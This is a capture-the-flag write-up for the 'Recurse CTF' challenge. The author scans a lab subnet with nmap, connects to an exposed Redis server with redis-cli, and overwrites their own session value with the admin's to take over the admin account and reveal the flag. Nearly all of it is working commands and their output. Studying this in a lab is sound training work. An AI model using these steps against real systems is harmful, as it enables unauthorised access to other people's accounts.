# Recurse CTF
> A CTF inside a CTF?
> 
> I know you have always wanted to hack a CTF... this is your chance! The admin has the real flag.
> 
> Some light scanning is allowed for this challenge 

I found this to be a very challenging flag to obtain. I failed to do so during competition, and only resolved it after getting a hint from the creator. 

This environment has a huge number of rabbit holes to fall in to. Rmember during these CTF events to follow KISS.

Open the CTF site and check your cookies. Observe a cookie named `redis-session`. We have a Redis server to target.

Open the terminal, check `netstat` to view active connections:
```
~ # netstat -a -n | grep ESTAB
tcp        0      0 10.112.6.197:6379       10.112.6.197:44808      ESTABLISHED
tcp        0      0 127.0.0.1:34426         127.0.0.1:6379          ESTABLISHED
tcp        0      0 10.112.6.197:44808      10.112.6.197:6379       ESTABLISHED
tcp        0      0 127.0.0.1:6379          127.0.0.1:34426         ESTABLISHED
tcp        0      0 127.0.0.1:6379          127.0.0.1:49190         ESTABLISHED
tcp        0      0 127.0.0.1:49190         127.0.0.1:6379          ESTABLISHED
tcp        0      0 ::ffff:10.112.6.197:8080 ::ffff:10.128.0.19:22604 ESTABLISHED
tcp        0      0 ::ffff:10.112.6.197:8080 ::ffff:10.128.0.10:19702 ESTABLISHED
tcp        0      7 ::ffff:10.112.6.197:8080 ::ffff:10.128.0.21:11235 ESTABLISHED
tcp        0      0 ::ffff:10.112.6.197:8080 ::ffff:10.128.0.21:33038 ESTABLISHED
```

Note there are two subnets in play here -- 10.112.6.0/24 and 10.128.0.0/24. Lets install nmap and do some scans (`apk add nmap`).

The subnet our shell _isn't_ on is a red herring, ignore it. If you scan it, you'll find a lot of interesting rabbit holes to fall in to.

Lets scan our local subnet for redis hosts:
```
~ # nmap 10.112.6.0/24 -p 6379 --open
Starting Nmap 7.80 ( https://nmap.org ) at 2022-12-18 08:26 UTC
Nmap scan report for recurse-ctf-9bc4d50bf1c15ddd-59b8955568-kfkzg (10.112.6.197)
Host is up (0.000082s latency).

PORT     STATE SERVICE
6379/tcp open  redis

Nmap done: 256 IP addresses (6 hosts up) scanned in 24.20 seconds
```

We have our target. Lets install redis-cli (`apk add redis`) and connect:
```
~ # redis-cli -h 10.112.6.197
10.112.6.197:6379> keys *
1) "session:348d6f5f-eea0-43d4-b7ed-ca3e0f40ca91"
```

This initial session was created before logging in, and is presumably for a pre-logged in user, hopefully our admin? Lets see the contents of the key:
```
10.112.6.197:6379> get session:348d6f5f-eea0-43d4-b7ed-ca3e0f40ca91
"\x80\x04\x95\x0b\x00\x00\x00\x00\x00\x00\x00}\x94\x8c\x02id\x94K\x01s."
```

Lets create an account on the site and log in, and then check for a new key:
```
10.112.6.197:6379> keys *
1) "session:348d6f5f-eea0-43d4-b7ed-ca3e0f40ca91"
2) "session:2da39ba1-ccdd-4300-af62-085eac9d8938"
10.112.6.197:6379> get session:2da39ba1-ccdd-4300-af62-085eac9d8938
"\x80\x04\x95\x0b\x00\x00\x00\x00\x00\x00\x00}\x94\x8c\x02id\x94K\x02s."
```

Assumption -- if we update our session key with the value from admin, we'll get admin privs. Lets try that:
```
10.112.6.197:6379> set "session:2da39ba1-ccdd-4300-af62-085eac9d8938" "\x80\x04\x95\x0b\x00\x00\x00\x00\x00\x00\x00}\x94\x8c\x02id\x94K\x01s."
OK
```

Refresh page and now we can see an `Admin panel` button. Click that to get flag:
`Congratulations you are the admin here is the flag: flag{1435eaab209a13f1cb3cf2207a6988bc}`

Cheers to congon4tor for such a fun but challenging flag.
